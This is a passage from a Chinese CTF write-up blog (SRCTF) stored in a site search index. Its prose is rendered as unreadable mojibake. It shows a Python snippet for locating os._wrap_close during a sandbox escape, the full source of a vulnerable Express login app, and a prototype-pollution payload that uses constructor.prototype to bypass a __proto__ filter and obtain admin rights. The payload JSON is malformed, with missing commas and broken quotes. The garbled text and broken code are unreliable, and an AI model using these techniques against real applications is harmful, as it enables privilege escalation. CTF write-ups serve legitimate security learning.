class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(allList):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;os._wrap_close&quot;</span> <span class="keyword">in</span> v:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(k) + <span class="string">&quot; &quot;</span> + <span class="string">&quot;---&gt;&quot;</span> + v)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹æ–‡æœ¬ï¼ˆç”±äºç¯‡å¹…é—®é¢˜æ²¡æœ‰å…¨æ”¾ï¼‰</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">class</span> &#x27;<span class="symbol">type</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">async_generator</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">int</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">bytearray_iterator</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">bytearray</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">bytes_iterator</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">bytes</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">builtin_function_or_method</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">callable_iterator</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">PyCapsule</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">cell</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">classmethod_descriptor</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">classmethod</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">code</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">complex</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">coroutine</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">dict_items</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">dict_itemiterator</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">dict_keyiterator</span>&#x27;&gt;, &lt;<span class="symbol">class</span> &#x27;<span class="symbol">dict_valueiterator</span>&#x27;&gt;</span><br></pre></td></tr></table></figure><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>æ‰«æç›®å½•å‘ç°æœ‰ä¸ª&#x2F;srcè·¯ç”±ï¼Œè®¿é—®å¯å¾—æºç </p><p>é¢˜ç›®æºç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>()</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line"><span class="attr">secret</span>: crypto.<span class="title function_">randomBytes</span>(<span class="number">64</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>),</span><br><span class="line"><span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">saveUninitialized</span>: <span class="literal">true</span></span><br><span class="line">&#125;))</span><br><span class="line"><span class="keyword">var</span> users = &#123;&#125;</span><br><span class="line"><span class="keyword">var</span> admins = &#123;&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;<span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line"><span class="keyword">if</span> (key === <span class="string">&#x27;__proto__&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line"><span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">target[key] = source[key]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> target</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkLogin</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">user</span>) &#123;</span><br><span class="line">res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="title function_">next</span>()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>) &#123;</span><br><span class="line"><span class="keyword">delete</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>[key]</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, checkLogin, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">res.<span class="title function_">send</span>(&#123;</span><br><span class="line"><span class="string">&#x27;user&#x27;</span>: req.<span class="property">session</span>.<span class="property">user</span>,</span><br><span class="line"><span class="string">&#x27;role&#x27;</span>: req.<span class="property">session</span>.<span class="property">role</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/public/login.html&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/src&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line"><span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;app.js&#x27;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/logout&#x27;</span>, checkLogin, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="title function_">destroy</span>()</span><br><span class="line">res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, checkLogin, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">role</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> flag = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;This is your flag: &#x27;</span> + flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">let</span> msg = <span class="string">&#x27;Your role is not admin&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">send</span>(msg);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> &#123; username, password &#125; = <span class="title function_">merge</span>(&#123;&#125;, req.<span class="property">body</span>)</span><br><span class="line"><span class="keyword">if</span> (username <span class="keyword">in</span> users === <span class="literal">false</span>)&#123;</span><br><span class="line">users[username] = password</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(username);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (password === users[username]) &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">user</span> = username</span><br><span class="line"><span class="keyword">if</span> (username <span class="keyword">in</span> admins) &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res.<span class="title function_">send</span>(&#123;</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;login success&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">res.<span class="title function_">send</span>(&#123;</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;login failed&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">5000</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;listen on 5000&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>å‘ç°å‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line"><span class="keyword">if</span> (key === <span class="string">&#x27;__proto__&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line"><span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">target[key] = source[key]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> target</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¡®å®šæ˜¯åŸå‹é“¾æ±¡æŸ“</p><p>è¿‡æ»¤äº† <strong>proto</strong> ï¼Œå¯ä»¥ç”¨ constructor.prototype æ¥ä»£æ›¿ï¼Œåˆ†ææºç å¯å¾—å½“ req.session.role æ˜¯ admin çš„æ—¶å€™ï¼Œè®¿é—® &#x2F;flag å³å¯å¾—åˆ°flag</p><p>çœ‹ä¸‹loginè·¯ç”±</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> &#123; username, password &#125; = <span class="title function_">merge</span>(&#123;&#125;, req.<span class="property">body</span>)</span><br><span class="line"><span class="keyword">if</span> (username <span class="keyword">in</span> users === <span class="literal">false</span>)&#123;</span><br><span class="line">users[username] = password</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(username);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (password === users[username]) &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">user</span> = username</span><br><span class="line"><span class="keyword">if</span> (username <span class="keyword">in</span> admins) &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res.<span class="title function_">send</span>(&#123;</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;login success&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">res.<span class="title function_">send</span>(&#123;</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;login failed&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>åªè¦æˆ‘ä»¬çš„ç™»å½•çš„ç”¨æˆ·ååœ¨adminså­—å…¸ä¸­ï¼Œè®¿é—®&#x2F;flagå°±å¯ä»¥å¾—åˆ°flag</p><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span></span><br><span class="line"><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span></span><br><span class="line"><span class="string">&quot;constructor&quot;</span><span class="string">&quot;&#123;</span></span><br><span class="line"><span class="string">   &quot;</span>prototype<span class="string">&quot;:&#123;</span></span><br><span class="line"><span class="string">      &quot;</span>test<span class="string">&quot;: &quot;</span><span class="number">1</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/08/18/SRCTF/image-20240829162203071.png" alt="image-20240829162203071"></p>]]></content>
      
      
      
        <tags>
            
            <tag> SRCTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
